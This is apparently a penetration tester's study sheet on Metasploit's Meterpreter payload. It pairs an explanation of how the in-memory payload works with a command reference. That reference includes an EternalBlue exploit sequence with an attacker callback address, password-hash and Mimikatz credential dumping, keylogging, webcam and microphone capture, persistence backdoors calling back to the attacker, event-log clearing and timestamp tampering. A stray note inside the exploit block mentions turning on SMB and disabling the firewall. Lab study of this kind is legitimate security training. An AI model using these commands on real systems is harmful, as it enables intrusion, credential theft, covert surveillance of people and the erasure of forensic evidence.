## Meterpreter (Meta-Interpreter)

**Meterpreter** is one of the most advanced and powerful post-exploitation payloads in the Metasploit Framework.

Designed for stealth, flexibility, and in-memory execution, it gives an attacker extensive control over a compromised system with minimal forensic footprint.

### What is Meterpreter?

- A fileless, in-memory payload that does not write to disk.
- Runs entirely inside the memory of an existing process using DLL injection.
- Extensible at runtime by loading additional modules.
- Provides a rich post-exploitation environment similar to a command interpreter.

### Components

- **1. Server Portion (Victim Side)**
    - Written in plain C.
    - Small, efficient, and runs fully in memory.
- **2. Client API (Attacker Side)**
    - Usually written in Ruby (inside Metasploit).
    - Can be implemented in any language.

### Key Features

- **Fileless Operation**
    - No executable saved on disk.
    - Avoids traditional antivirus detection.
- **In-Memory DLL Injection**
    - Uses Reflective DLL Injection to load code stealthily into memory.
- **Command Interpreter**
    - Works like a command shell but with advanced features.
- **Runtime Extension**
    - Can load additional DLLs at any time (e.g., stdapi, priv).

### Capabilities

- Command Execution: Run arbitrary system commands.
- Privilege Escalation: Attempt to elevate to SYSTEM or admin.
- Process Migration: Move Meterpreter into another running process to evade detection.
- File System Access: Read, write, upload, download files.
- Registry Manipulation: Interact with the Windows Registry.
- Pivoting: Use the compromised host to move deeper inside the network.

### How Meterpreter Works

- **1. Target Executes the Stager**
    - Examples: reverse_tcp, bind_tcp, findtag, passivex, etc.
- **2. Stager Loads the Reflective DLL**
    - The reflective loader injects the Meterpreter DLL into memory.
- **3. Meterpreter Core Initializes**
    - Establishes an encrypted TLS 1.0 communication channel.
    - Sends an initial request to Metasploit.
    - Metasploit configures the session.
- **4. Extensions Loaded**
    - Automatically or dynamically:
        - stdapi (always)
        - priv (if admin)
    - Additional DLL modules loaded over encrypted TLV messages.

### Meterpreter Design Goals

- **1. Stealthy**
    - Entirely in-memory (no disk artifacts).
    - Injects into existing processes → no new process creation.
    - Can migrate processes to evade detection.
    - Uses TLS-encrypted communication.
    - Minimal forensic footprint.
- **2. Powerful**
    - Supports complex post-exploitation operations such as:
        - Port forwarding
        - Screen capture
        - Keylogging
        - Shell spawning
        - Memory manipulation
- **3. Extensible**
    - Features added at runtime.
    - Extensions loaded dynamically over the network.
    - No recompilation required.

### How Runtime Extensions Are Added

- **1. Client uploads a DLL** over the Meterpreter communication channel.
- **2. Victim-side Meterpreter loads the DLL** in memory.
- **3. DLL registers itself** as a new extension.
- **4. Metasploit client loads the matching API**.
- **5. New commands become instantly available**.

## Meterpreter Commands

A quick-reference guide to the most commonly used Meterpreter commands during post-exploitation.

```
 use exploit/windows/smb/ms17_010_eternalblue
 show options
 set Rhost 10.211.195.22

 set Lhost 10.211.195.62
 set Lport 443
 exploit
 
 
 
 
✔ Check if File Sharing is ON

Open Control Panel

Go to Network and Sharing Center

Click Change advanced sharing settings

Turn ON:

Turn on network discovery

Turn on file and printer sharing

This automatically enables SMB service.
#Disable Windows Firewall
```

### Session & Core Commands

- Show available commands

```
help

```

- Display target system information

```
sysinfo

```

- Terminate the session

```
exit

```

- Background the session

```
background

```

- List all active sessions

```
sessions -l

```

- Interact with a session

```
sessions -i <id>

```

### Shell Access

- Drop into Windows command shell

```
shell

```

- Launch interactive PowerShell

```
powershell_shell

```

- Execute a program on the target

```
execute -f <program>

```

- List running processes

```
ps

```

- Migrate Meterpreter to another process

```
getuid

migrate <pid>

```

### Privilege Escalation

- Show current user

```
getuid

```

- List privileges

```
getprivs

```

- Show Windows privilege information

```
run post/windows/gather/win_privs

```

- Attempt to elevate to SYSTEM

```
run get_system

```

- Dump password hashes

```
hashdump

```

### File System Commands

- List directory contents

```
ls

```

- Change directory

```
cd <path>

```

- Print working directory

```
pwd

```

- Upload file

```
upload <local> <remote>
meterpreter > upload bee-box_v1.6.7z 'C:\Users\Public\'

```

- Download file

```
download <remote> <local>

```

- Edit file

```
edit <file>

```

- Delete file

```
rm <file>

```

- Create directory

```
mkdir <dir>

```

### Network Commands

- Show network interfaces

```
ipconfig

```

- Display routing table

```
route

```

- Add port forwarding

```
portfwd add -l <LPORT> -p <RPORT> -r <RHOST>

```

- List port forwards

```
portfwd list

```

- Delete port forward

```
portfwd delete -l <LPORT>

```

- Show ARP cache

```
arp

```

- Show network connections

```
netstat

```

### Post-Exploitation Modules

- Detect virtual machine

```
run post/windows/gather/checkvm

```

- Enumerate Windows information

```
run winenum

```

- Dump passwords & system data

```
run scraper

```

- Enable Remote Desktop

```
run post/windows/manage/enable_rdp

```

- Automated process migration

```
run post/windows/manage/migrate

```

### Webcam, Audio, Screenshot

- List webcams

```
webcam_list

```

- Take snapshot

```
webcam_snap

```

- Stream webcam

```
webcam_stream

```

- Record microphone

```
record_mic

```

- Capture screenshot

```
screenshot

```

### Keylogging & Credential Attacks

- Start keylogger

```
keyscan_start

```

- Dump keystrokes

```
keyscan_dump

```

- Stop keylogger

```
keyscan_stop

```

- Dump password hashes

```
hashdump

```

- Load Mimikatz (Kiwi)

```
load kiwi

```

- Show all collected credentials

```
creds_all

```

### Persistence & Backdoors

- Show persistence options

```
run persistence -h

```

- Create user-level persistence

```
run persistence -U -i 15 -p 4444 -r <LHOST>

```

- Scheduled task backdoor

```
run exploit/windows/local/persistence

```

### Bypass & Evasion

- Migrate to evade detection

```
migrate <pid>

```

- Clear Windows event logs

```
clearev

```

- Modify timestamp metadata

```
timestomp <file>

```

- Load stdapi

```
load stdapi

```

- Load privilege APIs

```
load priv

```
